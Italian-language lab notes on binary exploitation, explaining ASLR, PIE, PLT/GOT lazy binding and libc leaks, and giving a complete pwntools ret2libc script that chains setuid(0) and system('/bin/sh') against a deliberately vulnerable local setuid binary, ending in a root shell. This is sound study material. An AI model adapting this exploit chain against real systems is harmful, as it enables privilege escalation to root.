# Lab 04 — NX + ret2libc

**Tecnica:** ret2libc con catena ROP `setuid(0)` + `system("/bin/sh")` **Protezioni:** NX on · ASLR on · PIE off · no canary **Novità rispetto a 03:** NX blocca shellcode injection → serve saltare in libc; ASLR randomizza la base di libc → serve un leak preventivo

---

## Concetti consolidati

### ASLR vs PIE — cosa randomizza cosa

ASLR e PIE sono ortogonali e agiscono su segmenti diversi:

|Flag|Cosa randomizza|
|---|---|
|ASLR (`randomize_va_space`)|stack, heap, shared libraries (libc inclusa)|
|PIE (`-pie`)|segmento `.text` del binario principale|

Con `-no-pie`, il `.text` è sempre a `0x400000`. ASLR non può toccarlo — serve PIE per randomizzare anche quello.

> [!note] Scenario del lab PIE off → `.text` fisso → gadget e PLT a indirizzi statici ASLR on → libc cambia ad ogni run → serve il leak

### PIC e shared libraries

Su x86-64, **tutte le shared library sono compilate con PIC** — è un requisito hard dell'ABI. Il codice usa solo indirizzamento RIP-relativo, quindi ASLR può caricare la libreria a qualsiasi indirizzo senza dover patchare il `.text` (text relocations). Effetti pratici:

- `.text` di libc è condiviso tra tutti i processi (una copia fisica, N mapping virtuali)
- ASLR randomizza la **base** del mapping, non il contenuto

Su x86-32 PIC era opzionale — si potevano avere `.so` non-PIC con text relocations, lente e non condivisibili.

### PLT stub vs indirizzo libc reale

In un binario `-no-pie`, prendere l'indirizzo di una funzione esterna con `(void *)system` restituisce l'indirizzo del **PLT stub** — fisso dentro il binario, non un indirizzo libc.

```c
// SBAGLIATO per il leak:
printf("%p\n", (void *)system);   // stampa 0x400370 (PLT stub)

// CORRETTO:
printf("%p\n", dlsym(RTLD_DEFAULT, "system"));   // stampa 0x7f... (libc reale)
```

### GOT lazy binding e leak

Con lazy binding (default), un GOT entry viene risolto solo alla **prima chiamata** attraverso il PLT. Funzioni mai eseguite a runtime hanno il GOT ancora puntato al resolver — inutilizzabili come leak source.

Nel nostro programma, quando `read()` cede il controllo all'attaccante:

|Funzione|GOT entry|Usabile come leak|
|---|---|---|
|`printf`|indirizzo reale in libc ✓|sì|
|`read`|indirizzo reale in libc ✓|sì|
|`exit`|PLT resolver (dead code, mai chiamata)|no|

### ret2plt leak — approccio reale (senza sorgente modificato)

In un binario reale senza `dlsym`, il leak si fa in due fasi ROP:

**Fase 1** — chiamare `puts@plt(got[read])`: stampa gli 8 byte del GOT entry di `read` (già risolto), poi ritorna a `main` per un secondo overflow.

**Fase 2** — calcolare la base e costruire il payload finale:

```python
leaked_read  = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_read - libc.symbols["read"]
```

`dlsym` nel sorgente simula la fase 1 per semplicità del lab.

---

## Exploit

### Offset

```
buf[16] + saved RBP[8] = 24 byte
```

Confermato con GEF: crash → `x/gx $rsp` → `pattern offset <valore>` → 24.

### Calcolo della base

```python
libc.address = system_leak - libc.symbols["system"]
# libc.symbols["system"] con libc.address=0 restituisce il puro offset
# da quel momento tutti i symbols sommano automaticamente libc.address
```

### Catena ROP

```
[A×16][B×8] → pop rdi; ret → 0 → setuid → pop rdi; ret → /bin/sh → system
```

### Allineamento stack

`setuid` viene entrato con RSP ≡ 0 (mod 16) — sbagliato per ABI, ma è un thin syscall wrapper senza SSE → non crasha. Il suo epilogo (`pop rbp; ret`) riporta RSP a ≡ 8 prima di `system` → nessun crash MOVAPS.

### Script completo

```python
#!/usr/bin/env python3
from pwn import asm, context, ELF, p64, process, log

context.update(arch="amd64", os="linux")
elf  = ELF("./simple-bo-ret2libc-setuid", checksec=False)
libc = ELF(elf.libc.path, checksec=False)   # distro-agnostico

p = process("./simple-bo-ret2libc-setuid")

line        = p.recvline()
system_leak = int(line.split(b"@ ")[1].strip(), 16)
log.info(f"system leak : {hex(system_leak)}")

libc.address = system_leak - libc.symbols["system"]
log.info(f"libc base   : {hex(libc.address)}")

pop_rdi = next(libc.search(asm("pop rdi; ret")))
binsh   = next(libc.search(b"/bin/sh\x00"))

payload  = b"A" * 16 + b"B" * 8
payload += p64(pop_rdi) + p64(0)
payload += p64(libc.symbols["setuid"])
payload += p64(pop_rdi) + p64(binsh)
payload += p64(libc.symbols["system"])

p.sendline(payload)
p.interactive()
```

### Risultato

```
[*] system leak : 0x7f7372d42320
[*] libc base   : 0x7f7372d13000
$ id
uid=0(root) gid=1000(whitesteps) ...
```

---

## Gotcha

> [!warning] PLT stub In un binario `-no-pie`, `(void *)system` restituisce `system@plt` (es. `0x400370`), non l'indirizzo libc. Il leak produce una base spazzatura. Usare `dlsym` o una fase ROP di leak.

> [!warning] Lazy binding `exit` referenziato come dead code non viene mai chiamato → `exit@got` non è risolto → inutilizzabile come leak. Usare funzioni effettivamente chiamate prima dell'overflow.

> [!tip] Path libc portabile `elf.libc.path` è più robusto di un path hardcodato: funziona su Fedora (`/lib64/libc.so.6`), Debian/Ubuntu (`/lib/x86_64-linux-gnu/libc.so.6`) e qualsiasi altra distro.

> [!tip] SETUID e GDB GDB droppa il bit SETUID automaticamente. Debuggare sul binario non-setuid — l'offset è identico.

---

## Prossimo lab

- [ ] Ret2plt leak senza `dlsym` — fase 1 ROP che chiama `puts@plt(got[read])`, fase 2 con il payload finale. Stesso binario, sorgente non modificato.